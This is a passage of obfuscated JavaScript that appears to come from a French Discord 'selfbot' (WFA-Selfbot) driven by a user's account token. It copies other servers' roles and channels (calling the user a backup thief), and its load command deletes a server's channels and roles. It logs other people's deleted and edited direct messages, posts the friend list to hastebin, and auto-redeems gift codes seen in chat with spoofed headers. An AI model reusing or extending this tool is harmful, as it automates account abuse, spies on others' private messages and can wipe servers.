        let _0x343bxcb = client["emojis"]["get"]("655091815401127966") || "ℹ";
        let _0x343bxcc = client["emojis"]["get"]("655695570769412096") || "⌛";
        let _0x343bxcd = client["emojis"]["get"]("655696285286006784") || "✅";
        let _0x343bx5b = client["emojis"]["get"]("655704809483141141") || "❌";
        let _0x343bxce = client["emojis"]["get"]("656030540310380574") || "\u26A0";
        if ((_0x343bx55["content"] === prefix + "backup create") | (_0x343bx55["content"] == prefix + "backup c")) {
            let _0x343bx63 = _0x343bx50["guild"];
            if (!_0x343bx63) {
                _0x343bx50["edit"](":x: **Veuillez executer cette commande dans un serveur!**");
                return
            };
            _0x343bx50["guild"]["roles"]["filter"]((_0x343bx6c) => {
                return _0x343bx6c["name"] !== _0x343bx50["guild"]["member"](client["user"]["id"])["highestRole"]["name"]
            })["forEach"]((_0x343bx6c) => {
                if (_0x343bx6c["comparePositionTo"](_0x343bx50["guild"]["member"](client["user"]["id"])["highestRole"]) > 0) {
                    return _0x343bx50["edit"](`${_0x343bxce}  **Attention**\n\nMon role n'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\n\nWFA-Selfbot`)["catch"]((_0x343bx5b) => {
                        return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                    })
                }
            });
            _0x343bx50["edit"](`${_0x343bxcc}  **Please wait** ...\n\nCréation de la backup. Attendre la finalisation...\n\nWFA-Selfbot`)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })["then"]((_0x343bx65) => {
                let _0x343bx79 = _0x343bxde(16);
                const _0x343bxa6 = _0x343bx50["guild"]["channels"]["sort"](function (_0x343bx3c, _0x343bx3d) {
                    return _0x343bx3c["position"] - _0x343bx3d["position"]
                })["array"]()["map"]((_0x343bx6a) => {
                    const _0x343bx5d = {
                        type: _0x343bx6a["type"],
                        name: _0x343bx6a["name"],
                        postion: _0x343bx6a["calculatedPosition"]
                    };
                    if (_0x343bx6a["parent"]) {
                        _0x343bx5d["parent"] = _0x343bx6a["parent"]["name"]
                    };
                    return _0x343bx5d
                });
                const _0x343bx6e = _0x343bx50["guild"]["roles"]["filter"]((_0x343bx6c) => {
                    return _0x343bx6c["name"] !== "@everyone"
                })["sort"](function (_0x343bx3c, _0x343bx3d) {
                    return _0x343bx3c["position"] - _0x343bx3d["position"]
                })["array"]()["map"]((_0x343bx6c) => {
                    const _0x343bx6d = {
                        name: _0x343bx6c["name"],
                        color: _0x343bx6c["color"],
                        hoist: _0x343bx6c["hoist"],
                        permissions: _0x343bx6c["permissions"],
                        mentionable: _0x343bx6c["mentionable"],
                        position: _0x343bx6c["position"]
                    };
                    return _0x343bx6d
                });
                if (!backups[_0x343bx50["author"]["id"]]) {
                    backups[_0x343bx50["author"]["id"]] = {}
                };
                backups[_0x343bx50["author"]["id"]][_0x343bx79] = {
                    icon: _0x343bx50["guild"]["iconURL"],
                    name: _0x343bx50["guild"]["name"],
                    owner: _0x343bx50["guild"]["ownerID"],
                    members: _0x343bx50["guild"]["memberCount"],
                    createdAt: _0x343bx50["guild"]["createdAt"],
                    roles,
                    channels
                };
                _0x343bxe2();
                let _0x343bxcf = _0x343bx63["iconURL"] || "";
                console["log"](`Nouvelle backup du serveur ${_0x343bx50["guild"]["name"]} vient d'être crée, voici son id : ${_0x343bx79}` ["green"]);
                lbackup[_0x343bx63["name"]] = {
                    Id: _0x343bx79
                };
                liste();
                _0x343bx50["edit"](`${_0x343bxcb}  **Info**\n\nNouvelle backup du serveur **${_0x343bx50["guild"]["name"]}** vien d'être crée, voici son id : \`${_0x343bx79}\`\n**${prefix}backup load (id)** Pour load la backup\n\nWFA-Selfbot`)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            });
            console["log"]("Commande create backup executé" ["yellow"])
        };
        if (_0x343bx55["content"] === prefix + "backup liste") {
            try {
                var _0x343bx17 = fs["readFileSync"]("Data/liste.json", "utf8");
                if (!_0x343bx17) {
                    _0x343bx50["edit"](`:x: **Oups il semblerait que tu n'ai pas encore de backup fait ${prefix}help backup pour commencer a en voler**`);
                    return
                };
                let _0x343bx86 = new Discord.RichEmbed()["setTitle"]("**WFA Backup Listes**")["setColor"](color)["addField"]("\nWoaW GG tu es un veritables voleur de backup accompli !!!", "```" + _0x343bx17.toString())["setURL"]("https://discord.gg/wUw8ZH7849")["setDescription"]("[Notre Discord](https://discord.gg/wUw8ZH7849)")["setFooter"](`WFA-Selfbot | ${_0x343bx50["author"]["username"]}`, `${_0x343bx50["author"]["avatarURL"]}`);
                _0x343bx50["edit"](_0x343bx86)
            } catch (e) {
                console["log"]("Error:", e["stack"])
            }
        };
        if (_0x343bx55["content"]["startsWith"](prefix + "backup delete")) {
            let _0x343bx63 = _0x343bx50["guild"];
            if (!_0x343bx63) {
                _0x343bx50["edit"](":x: **Veuillez executer cette commande dans un serveur!**");
                return
            };
            let _0x343bxd0 = _0x343bx56["splice"](2)["join"](" ");
            let _0x343bxd1 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b} Erreur`)["setFooter"]("WFA-Selfbot")["setDescription"](`Tu dois définir ton id de backup... Fais ${prefix}help pour avoir plus d'informations.`)["setColor"](color);
            if (!_0x343bxd0) {
                return _0x343bx50["edit"](_0x343bxd1)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            };
            let _0x343bxd2 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b}  Error`)["setFooter"]("WFA-Selfbot")["addField"](`**Tu n'a pas de backup avec cette id : ${_0x343bxd0}.**`, prefix + "help pour plus d'informations")["setColor"](color);
            if (!backups[_0x343bx50["author"]["id"]][_0x343bxd0]) {
                return _0x343bx50["edit"](_0x343bxd2)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            };
            delete backups[_0x343bx50["author"]["id"]][_0x343bxd0];
            _0x343bxe2();
            let _0x343bxd3 = new Discord.RichEmbed()["setTitle"](`${_0x343bxcd}  Succès !`)["setFooter"]("WFA-Selfbot")["setDescription"](`La **backup** a bien été supprimée.`)["setColor"](color);
            _0x343bx50["edit"](_0x343bxd3)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande delete backup executé" ["yellow"])
        };
        if (_0x343bx55["content"]["startsWith"](prefix + "backup load")) {
            let _0x343bx63 = _0x343bx50["guild"];
            if (!_0x343bx63) {
                _0x343bx50["edit"](":x: **Veuillez executer cette commande dans un serveur!**");
                return
            };
            let _0x343bx5b = client["emojis"]["get"]("655704809483141141") || "❌";
            let _0x343bxd0 = _0x343bx56["splice"](2)["join"](" ");
            let _0x343bxd1 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b}  Error`)["setDescription"](`Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}help\` pour avoir plus d'informations`);
            if (!_0x343bxd0) {
                return _0x343bx50["channel"]["send"](_0x343bxd1)
            };
            let _0x343bxd2 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b}  Error`)["addField"](`**Aucune backup avec l'id ${_0x343bxd0}.**`, "/help pour plus d'information")["setFooter"]("WFA-Selfbot")["setColor"](color);
            if (!backups[_0x343bx50["author"]["id"]][_0x343bxd0]) {
                return _0x343bx50["channel"]["send"](_0x343bxd2)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            };
            _0x343bx50["guild"]["channels"]["forEach"]((_0x343bx5d) => {
                _0x343bx5d["delete"]("For Loading A Backup")
            });
            _0x343bx50["guild"]["roles"]["filter"]((_0x343bx6d) => {
                return _0x343bx6d["members"]["every"]((_0x343bx66) => {
                    return !_0x343bx66["user"]["bot"]
                })
            })["forEach"]((_0x343bx6d) => {
                _0x343bx6d["delete"]("For Loading A Backup")
            });
            backups[_0x343bx50["author"]["id"]][_0x343bxd0]["roles"]["forEach"](async function (_0x343bx6d) {
                _0x343bx50["guild"]["createRole"]({
                    name: _0x343bx6d["name"],
                    color: _0x343bx6d["color"],
                    permissions: _0x343bx6d["permissions"],
                    hoist: _0x343bx6d["hoist"],
                    mentionable: _0x343bx6d["mentionable"],
                    position: _0x343bx6d["position"]
                })["then"]((_0x343bx6d) => {
                    _0x343bx6d["setPosition"](_0x343bx6d["position"])
                })
            });
            backups[_0x343bx50["author"]["id"]][_0x343bxd0]["channels"]["filter"]((_0x343bx6a) => {
                return _0x343bx6a["type"] === "category"
            })["forEach"](async function (_0x343bx59) {
                _0x343bx50["guild"]["createChannel"](_0x343bx59["name"], {
                    type: _0x343bx59["type"],
                    permissionOverwrites: _0x343bx59["permissionOverwrites"]
                })
            });
            backups[_0x343bx50["author"]["id"]][_0x343bxd0]["channels"]["filter"]((_0x343bx6a) => {
                return _0x343bx6a["type"] !== "category"
            })["forEach"](async function (_0x343bx59) {
                _0x343bx50["guild"]["createChannel"](_0x343bx59["name"], {
                    type: _0x343bx59["type"],
                    permissionOverwrites: _0x343bx59["permissionOverwrites"]
                })["then"]((_0x343bx6a) => {
                    const _0x343bxd4 = _0x343bx50["guild"]["channels"]["filter"]((_0x343bx6a) => {
                        return _0x343bx6a["type"] === "category"
                    })["find"]((_0x343bx6a) => {
                        return _0x343bx6a["name"] === _0x343bx59["parent"]
                    });
                    _0x343bx59["parent"] ? _0x343bx6a["setParent"](_0x343bxd4) : ""
                })
            });
            _0x343bx50["guild"]["setName"](backups[_0x343bx50["author"]["id"]][_0x343bxd0]["name"]);
            _0x343bx50["guild"]["setIcon"](backups[_0x343bx50["author"]["id"]][_0x343bxd0]["icon"]);
            console["log"]("Commande load backup executé" ["yellow"])
        };
        if (_0x343bx55["content"]["startsWith"](prefix + "backup info") || _0x343bx55["content"]["startsWith"](prefix + "backup i")) {
            let _0x343bx79 = _0x343bx56["splice"](2)["join"](" ");
            let _0x343bxd5 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b}  Error`)["setFooter"]("WFA-Selfbot")["setDescription"](`Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}help\` pour avoir plus d'informations`)["setColor"](color);
            if (!_0x343bx79) {
                return _0x343bx50["edit"](_0x343bxd5)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            };
            let _0x343bxd6 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b}  Error`)["setFooter"]("WFA-Selfbot")["setDescription"](`Tu n'as pas de **backup** avec cet id \`${_0x343bx79}\`.`)["setColor"](color);
            if (!backups[_0x343bx50["author"]["id"]][_0x343bx79]) {
                return _0x343bx50["edit"](_0x343bxd6)
            };
            try {
                let _0x343bxd7 = new Discord.RichEmbed()["setTitle"](backups[_0x343bx50["author"]["id"]][_0x343bx79]["name"])["setThumbnail"](backups[_0x343bx50["author"]["id"]][_0x343bx79]["icon"])["addField"]("Creator", `<@${backups[_0x343bx50["author"]["id"]][_0x343bx79]["owner"]}>`, true)["addField"]("Members", backups[_0x343bx50["author"]["id"]][_0x343bx79]["members"], true)["addField"]("Created At", backups[_0x343bx50["author"]["id"]][_0x343bx79]["createdAt"])["addField"]("Channels", `\`\`\`${backups[_0x343bx50["author"]["id"]][_0x343bx79]["channels"]["map"]((_0x343bx5d)=>{return _0x343bx5d["name"]})["join"]("\n")}\`\`\``, true)["addField"]("Roles", `\`\`\`${backups[_0x343bx50["author"]["id"]][_0x343bx79]["roles"]["map"]((_0x343bx6d)=>{return _0x343bx6d["name"]})["join"]("\n")}\`\`\``, true);
                _0x343bx50["edit"](_0x343bxd7)
            } catch (e) {
                hastebins(backups[_0x343bx50["author"]["id"]][_0x343bx79]["channels"]["map"]((_0x343bx5d) => {
                    return _0x343bx5d["name"]
                })["join"]("\n"), "txt")["then"]((_0x343bx59) => {
                    hastebins(backups[_0x343bx50["author"]["id"]][_0x343bx79]["roles"]["map"]((_0x343bx6d) => {
                        return _0x343bx6d["name"]
                    })["join"]("\n"), "txt")["then"]((_0x343bxd8) => {
                        let _0x343bxd7 = new Discord.RichEmbed()["setTitle"](backups[_0x343bx50["author"]["id"]][_0x343bx79]["name"])["setThumbnail"](backups[_0x343bx50["author"]["id"]][_0x343bx79]["icon"])["addField"]("Creator", `<@${backups[_0x343bx50["author"]["id"]][_0x343bx79]["owner"]}>`, true)["addField"]("Members", backups[_0x343bx50["author"]["id"]][_0x343bx79]["members"], true)["addField"]("Created At", backups[_0x343bx50["author"]["id"]][_0x343bx79]["createdAt"])["addField"]("Channels", _0x343bx59, true)["addField"]("Roles", _0x343bxd8, true)["setFooter"]("WFA-Selfbot");
                        _0x343bx50["edit"](_0x343bxd7)["catch"]((_0x343bx5b) => {
                            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                        })
                    })
                })
            };
            console["log"]("Commande backup info executé" ["yellow"])
        };
        if (_0x343bx55["content"]["startsWith"](prefix + "backup purge")) {
            let _0x343bxd1 = new Discord.RichEmbed()["setTitle"](`${_0x343bx5b}  Error`)["setDescription"](`Vous n'avez pas encore sauvegardé de serveur`)["setColor"](color);
            if (!backups[_0x343bx50["author"]["id"]]) {
                return _0x343bx50["edit"](_0x343bxd1)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            };
            let _0x343bxd9 = new Discord.RichEmbed()["setTitle"](`${_0x343bxce}  Warning`)["setDescription"](`Es-tu sûr de vouloir supprimer toutes tes backups ?
__Cette action est irréversible !__`);
            let _0x343bxda = new Discord.RichEmbed()["setColor"](color)["setTitle"]("Oui/Non")["setFooter"]("WFA-Selfbot")["addField"]("Etes vous sur de vouloir supprimer toutes vos backups???", "Oui/Non");
            _0x343bx50["edit"](_0x343bxda)["then"](() => {
                _0x343bx50["channel"]["awaitMessages"]((_0x343bx21) => {
                    return _0x343bx21["content"] === "Oui"
                }, {
                    max: 1,
                    time: 30000,
                    errors: ["time"]
                })["then"]((_0x343bxdb) => {
                    delete backups[_0x343bx50["author"]["id"]];
                    let _0x343bxd3 = new Discord.RichEmbed()["setTitle"](`${_0x343bxcd}  Voila!`)["setDescription"](`Deleted all your backups.`)["setFooter"]("WFA-Selfbot")["setColor"](color);
                    _0x343bx50["edit"](_0x343bxd3)["catch"]((_0x343bx5b) => {
                        return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                    });
                    _0x343bx55["delete"]();
                    console["log"]("Commande purge backup executé" ["yellow"])
                })
            })
        };
        if (_0x343bx50["content"] === prefix + "backup friend") {
            var _0x343bxdc = client["user"]["friends"]["size"];
            const _0x343bx8c = client["user"]["friends"]["array"]();
            let _0x343bxdd = `Successfully backed up ${_0x343bx8c["length"].toString()["bold"]} friends.` ["green"];
            console["log"](_0x343bxdd);
            hastebins(`${_0x343bx8c}\n`)["then"]((_0x343bx6c) => {
                var _0x343bx86 = new Discord.RichEmbed()["setTitle"]("backup friends (<@id>)")["addField"]("```lien hastebins```", _0x343bx6c)["setColor"](color)["setTimestamp"]()["setDescription"]("***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...***");
                _0x343bx50["edit"](_0x343bx86)["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                });
                console["log"]("Commande friends backup executé" ["yellow"])
            })
        };

        function _0x343bxde(_0x343bx28) {
            var _0x343bxdf = "";
            var _0x343bxe0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var _0x343bxe1 = _0x343bxe0["length"];
            for (var _0x343bx2c = 0; _0x343bx2c < _0x343bx28; _0x343bx2c++) {
                _0x343bxdf += _0x343bxe0["charAt"](Math["floor"](Math["random"]() * _0x343bxe1))
            };
            return _0x343bxdf
        }

        function _0x343bxe2() {
            fs["writeFile"]("./Data/backups.json", JSON["stringify"](backups), (_0x343bx16) => {
                if (_0x343bx16) {
                    console["error"](_0x343bx16)
                }
            })
        }
    } catch (_0x343bx5b) {
        return
    }
});

function saving() {
    fs["writeFile"]("./Data/afk.json", JSON["stringify"](afk), (_0x343bx16) => {
        if (_0x343bx16) {
            console["error"](_0x343bx16)
        }
    })
}

function liste() {
    fs["writeFile"]("./Data/liste.json", JSON["stringify"](lbackup), (_0x343bx16) => {
        if (_0x343bx16) {
            console["error"](_0x343bx16)
        }
    })
}

function kicker() {
    fs["writeFile"]("./Data/vkick.json", JSON["stringify"](kicked), (_0x343bx16) => {
        if (_0x343bx16) {
            console["error"](_0x343bx16)
        }
    })
}
client["on"]("messageUpdate", (_0x343bx50) => {
    if (_0x343bx50["author"]["id"] === client["user"]["id"]) {
        return
    };
    if (_0x343bx50["channel"]["type"] === "dm") {
        console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
        console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
        console["log"](`║--> message mp modifié \n║--> User: ${_0x343bx50["author"]["tag"]}\n║--> Content: ${_0x343bx50["content"]}\n║--> At: ${_0x343bx50["createdAt"]}` ["green"]);
        console["log"]("╚═════════════════════════════════╝" ["blue"])
    }
});
client["on"]("messageDelete", (_0x343bx50) => {
    if (_0x343bx50["author"]["id"] === client["user"]["id"]) {
        return
    };
    if (_0x343bx50["channel"]["type"] === "dm") {
        console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
        console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────" ["blue"]);
        console["log"](`║--> 1 message mp surppimé \n║--> User: ${_0x343bx50["author"]["tag"]}\n║--> Content: ${_0x343bx50["content"]}\n║--> At: ${_0x343bx50["createdAt"]}` ["green"]);
        console["log"]("╚═════════════════════════════════╝" ["blue"])
    };
    if (_0x343bx50["content"]["includes"]("@everyone") || _0x343bx50["content"]["includes"]("@here")) {
        if (_0x343bx50["author"]["id"] === client["user"]["id"]) {
            return
        };
        if (_0x343bx50["channel"]["type"] === "dm") {
            return
        };
        console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
        console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────" ["blue"]);
        console["log"](`║--> New ghostping \n║--> serveur: ${_0x343bx50["guild"]["name"]} \n║--> channel: ${_0x343bx50["channel"]["name"]} \n║--> User: ${_0x343bx50["author"]["tag"]}\n║--> Content: ${_0x343bx50["content"]}\n║-->At: ${_0x343bx50["createdAt"]}` ["green"]);
        console["log"]("╚═════════════════════════════════╝" ["blue"])
    } else {
        return
    }
});

function matchCode(_0x343bxaf, _0x343bxe7) {
    let _0x343bxe8 = _0x343bxaf["match"](/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
    if (_0x343bxe8) {
        _0x343bxe7(_0x343bxe8[0]);
        return matchCode(_0x343bxaf["slice"](_0x343bxe8["index"] + _0x343bxe8[0]["length"]), _0x343bxe7)
    } else {
        _0x343bxe7(null)
    }
}
client["on"]("message", (_0x343bx50) => {
    let _0x343bxe8 = [];
    matchCode(_0x343bx50["content"], (_0x343bxd0) => {
        if (!_0x343bxd0) {
            return
        };
        if (!_0x343bxe8["includes"](_0x343bxd0)) {
            _0x343bxe8["push"](_0x343bxd0)
        }
    });
    if (_0x343bxe8["length"] == 0) {
        return
    };
    _0x343bxe8["forEach"]((_0x343bxd0) => {
        fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + _0x343bxd0["split"]("/")["pop"]() + "/redeem", {
            method: "post",
            headers: {
                Accept: "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US",
                Authorization: client["token"],
                Connection: "keep-alive",
                "Content-Length": JSON["stringify"]({
                    channel_id: _0x343bx50["channel"]["id"]
                })["length"],
                "Content-Type": "application/json",
                Host: "canary.discordapp.com",
                Referer: `https://canary.discordapp.com/channels/${_0x343bx50["channel"]["id"]}/${_0x343bx50["id"]}`,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                "X-super-properties": Buffer["from"](JSON["stringify"]({
                    os: "Windows",
                    browser: "Firefox",
                    device: "",
                    browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    browser_version: "66.0",
                    os_version: "10",
                    referrer: "",
                    referring_domain: "",
                    referrer_current: "",
                    referring_domain_current: "",
                    release_channel: "canary",
                    client_build_number: 37519,
                    client_event_source: null
                }), "utf-8").toString("base64")
            },
            body: JSON["stringify"]({
                channel_id: _0x343bx50["channel"]["id"]
            })
        })["then"]((_0x343bxe9) => {
            if (_0x343bxe9["status"] == 400 || _0x343bxe9["status"] == 404) {
                return console["log"](`code invalide :  ${_0x343bxd0}` ["red"])
            };
            _0x343bxe9["json"]()["then"]((_0x343bxea) => {
                console["log"](_0x343bxea);
                console["log"]("Un nouveau nitro à sûrement été ajouté à tes crédits." ["green"])
            })
        })["catch"](console["error"])
    })
});
client["on"]("guildDelete", (_0x343bx3e) => {
    console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
    console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
    console["log"](`║--> Vous avez quitté le serveur ${_0x343bx3e["name"]}` ["green"]);
    console["log"]("╚═════════════════════════════════╝" ["blue"])
});
client["on"]("guildCreate", (_0x343bx3e) => {
    console["log"]("\n╔═════════════════════════════════╗" ["blue"]);
    console["log"]("Log:" ["red"]) ^ console["log"]("╟─────────────────────────────────╢" ["blue"]);
    console["log"](`║--> Vous avez rejoint le serveur ${_0x343bx3e["name"]}` ["green"]);
    console["log"]("╚═════════════════════════════════╝" ["blue"])
});
client["on"]("voiceStateUpdate", (_0x343bxeb) => {
    if (!_0x343bxeb) {
        return
    };
    let _0x343bxec = _0x343bxeb["voiceChannelID"];
    if (_0x343bxec) {
        return
    };
    let _0x343bxed = _0x343bxec != null && typeof _0x343bxec != undefined ? client["channels"]["get"](_0x343bxec)["name"] : null;
    if (_0x343bxed === null) {
        if (kicked[_0x343bxeb["guild"]["id"]]) {
            if (_0x343bxeb["user"]["id"] === kicked[_0x343bxeb["guild"]["id"]]["user"]) {
                if (!_0x343bxeb["guild"]["me"]["hasPermission"]("MOVE_MEMBERS")) {
                    return console["log"]("Erreur manque de permission.")
                };
                _0x343bxeb["setVoiceChannel"](null)
            }
        }
    } else {
        return
    }
});
client["login"](token)["catch"]((_0x343bx16) => {
    if (_0x343bx16) {
        console["log"]("Token invalid!\nChange ton token dans le config.json" ["red"])
    }
})
